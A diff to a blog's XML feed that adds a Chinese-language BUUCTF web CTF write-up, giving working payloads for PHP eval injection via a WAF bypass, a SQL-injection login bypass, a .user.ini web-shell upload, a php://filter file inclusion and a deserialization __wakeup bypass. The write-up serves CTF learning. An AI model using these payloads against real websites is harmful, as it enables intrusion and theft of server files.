@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>BUUCTF web writeup(三)</title>
+    <link href="/newblog/2020/04/12/BUUCTF-web-writeup-%E4%B8%89/"/>
+    <url>/newblog/2020/04/12/BUUCTF-web-writeup-%E4%B8%89/</url>
+    
+    <content type="html"><![CDATA[<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>题目是一个计算器，F12看到上了waf，去看看calc.php内容</p><pre><code class="php">&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;])){    show_source(__FILE__);}else{        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) {                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&#39;echo &#39;.$str.&#39;;&#39;);}?&gt;</code></pre><p>知识点:当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。因为waf只是限制了<code>num</code>，分辨不出<code>num</code></p><pre><code>用chr转化成ascll码进行绕过payload:calc.php?%20num=1;var_dump(scandir(chr(47)));1array(24) { [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(4) &quot;boot&quot; [5]=&gt; string(3) &quot;dev&quot; [6]=&gt; string(3) &quot;etc&quot; [7]=&gt; string(5) &quot;f1agg&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(3) &quot;opt&quot; [14]=&gt; string(4) &quot;proc&quot; [15]=&gt; string(4) &quot;root&quot; [16]=&gt; string(3) &quot;run&quot; [17]=&gt; string(4) &quot;sbin&quot; [18]=&gt; string(3) &quot;srv&quot; [19]=&gt; string(8) &quot;start.sh&quot; [20]=&gt; string(3) &quot;sys&quot; [21]=&gt; string(3) &quot;tmp&quot; [22]=&gt; string(3) &quot;usr&quot; [23]=&gt; string(3) &quot;var&quot; }payload:calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code></pre><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>简单，一个sql注入万能密码。</p><pre><code>payload:username=admin+%27+--%2B&amp;password=%27123</code></pre><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>通过看大佬的wp学到了<code>.user.ini</code>的用法。<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。<br>利用<code>auto_prepend_file</code>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。这样就可以加载后门了。<br>上传的图片类型检测，可以通过hex填图片类型的头通过。<code>&lt;?</code>在黑名单里，可以通过javascript调用php执行。<br><img src="http://120.26.91.51:4001/uploads/big/29a0cb283867fe7248eec659d66e1ab1.png" srcset="/newblog/img/loading.gif" alt="图片"></p><pre><code>payload:/uploads/48cd8b43081896fbd0931d204f947663/index.php?cxy=var_dump(scandir(&quot;/&quot;));/uploads/48cd8b43081896fbd0931d204f947663/index.php?cxy=var_dump(file_get_contents(&quot;/flag&quot;));</code></pre><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>打开F12看到Archive_room.php，访问后点击secret发现查阅结束，打开burp拦截可以看到secr3t.php，访问得到</p><pre><code>&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET[&#39;file&#39;];    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){        echo &quot;Oh no!&quot;;        exit();    }    include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;</code></pre><p>明显的文件包含+php伪协议。构造payload</p><pre><code>secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>base64解码后得到源码，里面有flag。</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开提示有备份网站的习惯，直接访问<a href="http://www.zip成功下载到备份。查看源码发现是一道php反序列化的题" target="_blank" rel="noopener">www.zip成功下载到备份。查看源码发现是一道php反序列化的题</a></p><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>通过<code>__destruct</code>来<code>echo $flag</code>,满足条件两个条件就行。</p><pre><code>$a = new Name(&#39;admin&#39;,100);$b=serialize($a);echo $b;</code></pre><p>魔术方法:serialize() 函数会检查类中是否存在一个魔术方法 <strong>sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。与之相反，unserialize() 会检查是否存在一个 </strong>wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。<br>所以这里需要修改Object后的数字来绕过魔术方法，也是一个比较常见的知识点。</p><pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}</code></pre><p>修改为</p><pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre><p>这里的%00是因为私有变量序列化后会产生\x00，复制以后就丢失了，在浏览器上自己补充上%00.</p><pre><code>payload:index.php?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>python实现转轮密码机</title>
     <link href="/newblog/2020/04/06/python%E5%AE%9E%E7%8E%B0%E8%BD%AC%E8%BD%AE%E5%AF%86%E7%A0%81%E6%9C%BA/"/>
     <url>/newblog/2020/04/06/python%E5%AE%9E%E7%8E%B0%E8%BD%AC%E8%BD%AE%E5%AF%86%E7%A0%81%E6%9C%BA/</url>
@@ -95,9 +120,9 @@
     
     <tags>
       
-      <tag>linux</tag>
-      
       <tag>web</tag>
+      
+      <tag>linux</tag>
       
       <tag>tomcat</tag>
       
